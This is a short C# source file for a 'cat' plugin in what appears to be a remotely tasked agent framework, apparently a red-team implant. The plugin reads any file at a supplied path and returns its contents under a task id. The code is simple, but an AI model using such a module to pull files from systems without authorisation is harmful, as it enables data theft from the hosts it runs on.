using System;
using System.Collections.Generic;
using System.IO;
using PluginBase;

namespace Plugins
{
    public class Plugin : AthenaPlugin
    {
        public override string Name => "cat";
        public override void Execute(Dictionary<string, object> args)
        {
            try
            {
                if (args.ContainsKey("path"))
                {
                    PluginHandler.Write(File.ReadAllText(args["path"].ToString().Replace("\"", "")), (string)args["task-id"], true);
                }
                else
                {
                    PluginHandler.Write("Missing path parameter", (string)args["task-id"], true, "error");
                }
            }
            catch (Exception e)
            {
                PluginHandler.Write(e.ToString(), (string)args["task-id"], true, "error");
            }
        }
    }
}

